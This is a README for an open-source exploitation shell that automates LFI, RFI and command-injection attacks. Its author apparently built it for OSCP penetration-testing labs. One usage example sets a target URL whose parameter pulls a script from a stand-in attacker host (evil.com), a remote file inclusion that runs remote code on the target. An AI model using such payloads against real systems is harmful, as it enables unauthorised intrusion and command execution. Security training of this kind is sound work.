# shellfire

_shellfire_ is an exploitation shell which focuses on exploiting LFI, RFI, and 
command injection vulnerabilities.

Recently, I received some inspiration while working on my OSCP labs. I 
accidentally ended up writing this script, and it ended up helping me pwn a 
number of boxes in the labs.

Now that my labs are finished, I thought maybe other people could find this as 
useful as I have, so I decided to open source my tool.

## Features  

- [X] Persistent named configuration for multiple targets (and sharing!)  
- [X] Plugin system  
- [X] PHP payload  
- [X] ASP payload  
- [X] Dockerized vulnerable apps for testing  


## Installation  

Run `pip install -r requirements.txt` to install the application dependencies.  


## A few useful hints

To use shellfire, just fire it up via python (or add execute permissions and 
launch it directly). For example:

```
$ python shellfire.py
[*] ShellFire v0.1
[*] Type '.help' to see available commands
>>
```

You can type `.help` at any time for a list of available commands, or append 
the command you want to know more information about to help for specific 
details. For example `.help http`.

To start exploitation, you need to specify at least the URL of your target. 
Something like the following should work:

```
>> .url http://example.com/?path=http://evil.com/script.php
```

At this point, you should have enough to exploit easy vulnerabilities. You can 
simply start executing commands and they will be sent over to the target.

For more complex vulnerabilities, you may need to specify additional options. 
To exemplify, let's assume you needed to send a cookie with a session ID in 
order to exploit your target. You may want to add something like this:

```
>> .cookies { "session_id" : "123456789" }
```

Additional options, and information on how to use them, can be discovered by 
using the `.help` option in the shell.

Thanks to Offensive-Security for inspiring the creation of this utility.

Please use this tool for good.

Happy hacking!


## Testing  

The [docker](/docker) directory contains a small collection of vulnerable 
applications for testing shellfire's functionality.